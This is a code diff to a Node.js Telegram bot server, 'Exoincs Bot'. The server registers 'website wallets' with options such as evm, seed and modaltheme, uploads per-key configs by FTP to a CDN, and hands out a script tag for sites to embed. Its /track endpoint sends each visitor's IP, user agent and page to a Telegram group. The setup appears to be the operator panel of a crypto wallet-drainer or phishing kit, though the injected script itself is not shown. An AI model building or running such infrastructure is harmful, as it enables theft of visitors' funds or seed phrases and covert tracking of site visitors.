@@ -1,4 +1,4 @@
-// server.js – Telegram bot with FTP upload to CDN, visitor tracking, group notifications
+// server.js – Telegram bot with FTP upload, visitor tracking, group notifications
 require('dotenv').config();
 const express = require('express');
 const crypto = require('crypto');
@@ -13,11 +13,10 @@ const PORT = process.env.PORT || 3000;
 const API_BASE = process.env.API_BASE; // e.g., https://your-bot.onrender.com
 const CDN_BASE = process.env.CDN_BASE; // e.g., https://assets.cdn.express
 
-// FTP config
 const FTP_HOST = process.env.FTP_HOST;
 const FTP_USER = process.env.FTP_USER;
 const FTP_PASSWORD = process.env.FTP_PASSWORD;
-const FTP_SECURE = process.env.FTP_SECURE === 'true'; // true if FTPS
+const FTP_SECURE = process.env.FTP_SECURE === 'true';
 
 if (!BOT_TOKEN || !FTP_HOST || !FTP_USER || !FTP_PASSWORD) {
     console.error('❌ Missing required environment variables');
@@ -42,12 +41,11 @@ db.serialize(() => {
     )`);
 });
 
-// Helper: generate API key
 function generateApiKey() {
     return crypto.randomBytes(16).toString('hex');
 }
 
-// Helper: upload JSON config to CDN via FTP
+// ---------- FTP UPLOAD ----------
 async function uploadConfigToCDN(apiKey, config) {
     const client = new ftp.Client();
     client.ftp.verbose = true;
@@ -58,14 +56,12 @@ async function uploadConfigToCDN(apiKey, config) {
             password: FTP_PASSWORD,
             secure: FTP_SECURE
         });
-        // Ensure /configs directory exists
         await client.ensureDir('/configs');
         const remotePath = `/configs/${apiKey}.json`;
         const jsonStr = JSON.stringify(config, null, 2);
-        // Upload from buffer
         await client.uploadFrom(Buffer.from(jsonStr), remotePath);
         client.close();
-        console.log(`✅ Config uploaded to CDN: ${remotePath}`);
+        console.log(`✅ Config uploaded: ${remotePath}`);
     } catch (err) {
         console.error('FTP upload failed:', err);
         throw err;
@@ -76,7 +72,6 @@ async function uploadConfigToCDN(apiKey, config) {
 const app = express();
 app.use(express.json());
 
-// Endpoint: get config for given API key (used by CDN script)
 app.get('/config', (req, res) => {
     const key = req.query.key;
     if (!key) return res.status(400).json({ error: 'Missing key' });
@@ -86,7 +81,6 @@ app.get('/config', (req, res) => {
     });
 });
 
-// Endpoint: track visitor (called by CDN script)
 app.post('/track', async (req, res) => {
     const { key, ua, url, referrer } = req.body;
     const ip = req.headers['cf-connecting-ip'] || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
@@ -96,9 +90,9 @@ app.post('/track', async (req, res) => {
         const groupId = row.group_id;
         const domain = row.domain;
         if (groupId) {
-            const message = `🔔 *New Visitor*\n🌐 Domain: ${domain}\n📱 IP: ${ip}\n🖥️ UA: ${ua}\n📍 Page: ${url}`;
+            const message = `🔔 <b>New Visitor</b>\n🌐 Domain: ${domain}\n📱 IP: ${ip}\n🖥️ UA: ${ua}\n📍 Page: ${url}`;
             try {
-                await bot.telegram.sendMessage(groupId, message, { parse_mode: 'Markdown' });
+                await bot.telegram.sendMessage(groupId, message, { parse_mode: 'HTML' });
             } catch(e) { console.error('Failed to send to group:', e.message); }
         }
         res.json({ ok: true });
@@ -109,19 +103,19 @@ app.post('/track', async (req, res) => {
 const bot = new Telegraf(BOT_TOKEN);
 
 bot.start((ctx) => {
-    ctx.reply(`🤖 *Exoincs Bot* – Register your website wallet.
+    ctx.reply(`🤖 <b>Exoincs Bot</b> – Register your website wallet.
 
 Commands:
-/register <domain> <exogator_id> <modaltheme> <towsteps> <evm> <seed> <auto> <dark> <group_id>
+/register &lt;domain&gt; &lt;exogator_id&gt; &lt;modaltheme&gt; &lt;towsteps&gt; &lt;evm&gt; &lt;seed&gt; &lt;auto&gt; &lt;dark&gt; &lt;group_id&gt;
 /list
-/stats <api_key>
+/stats &lt;api_key&gt;
 /help
 
 Example:
-\`/register example.com EXO123 3 1 1 0 0 0 -1001234567890\`
+<code>/register example.com EXO123 3 1 1 0 0 0 -1001234567890</code>
 
 After registration, use this script on your website:
-\`<script src="${CDN_BASE}/exo-api.js?key=YOUR_API_KEY"></script>\``, { parse_mode: 'Markdown' });
+<code>&lt;script src="${CDN_BASE}/exo-api.js?key=YOUR_API_KEY"&gt;&lt;/script&gt;</code>`, { parse_mode: 'HTML' });
 });
 
 bot.command('register', async (ctx) => {
@@ -150,16 +144,7 @@ bot.command('register', async (ctx) => {
             (err) => {
                 if (err) return ctx.reply('❌ Failed to save. Possibly duplicate?');
                 const scriptUrl = `${CDN_BASE}/exo-api.js?key=${apiKey}`;
-                ctx.reply(`✅ *Registration successful!*
-
-🔑 API Key: \`${apiKey}\`
-📜 Script URL:
-\`${scriptUrl}\`
-
-Add this to your website &lt;body&gt;:
-\`<script src="${scriptUrl}"></script>\`
-
-Visitors will be reported to group ${group_id}.`, { parse_mode: 'Markdown' });
+                ctx.reply(`✅ <b>Registration successful!</b>\n\n🔑 API Key: <code>${apiKey}</code>\n📜 Script URL:\n<code>${scriptUrl}</code>\n\nAdd this to your website &lt;body&gt;:\n<code>&lt;script src="${scriptUrl}"&gt;&lt;/script&gt;</code>\n\nVisitors will be reported to group ${group_id}.`, { parse_mode: 'HTML' });
             });
     } catch (err) {
         console.error(err);
@@ -171,19 +156,19 @@ bot.command('list', (ctx) => {
     if (ADMIN_ID && ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('Admin only');
     db.all(`SELECT api_key, domain, created_at FROM keys`, (err, rows) => {
         if (err || !rows.length) return ctx.reply('No keys.');
-        let msg = '*Registered APIs:*\n';
-        rows.forEach(r => msg += `🔑 \`${r.api_key}\` – ${r.domain} (${r.created_at})\n`);
-        ctx.reply(msg, { parse_mode: 'Markdown' });
+        let msg = '<b>Registered APIs:</b>\n';
+        rows.forEach(r => msg += `🔑 <code>${r.api_key}</code> – ${r.domain} (${r.created_at})\n`);
+        ctx.reply(msg, { parse_mode: 'HTML' });
     });
 });
 
 bot.command('stats', (ctx) => {
     const args = ctx.message.text.split(' ');
-    if (args.length < 2) return ctx.reply('Usage: /stats <api_key>');
+    if (args.length < 2) return ctx.reply('Usage: /stats &lt;api_key&gt;');
     const key = args[1];
     db.get(`SELECT domain, created_at FROM keys WHERE api_key = ?`, [key], (err, row) => {
         if (err || !row) return ctx.reply('Not found');
-        ctx.reply(`📊 *Stats for \`${key}\`*\nDomain: ${row.domain}\nRegistered: ${row.created_at}\n(Detailed visitor logs coming soon)`, { parse_mode: 'Markdown' });
+        ctx.reply(`📊 <b>Stats for <code>${key}</code></b>\nDomain: ${row.domain}\nRegistered: ${row.created_at}\n(Detailed logs coming soon)`, { parse_mode: 'HTML' });
     });
 });
 
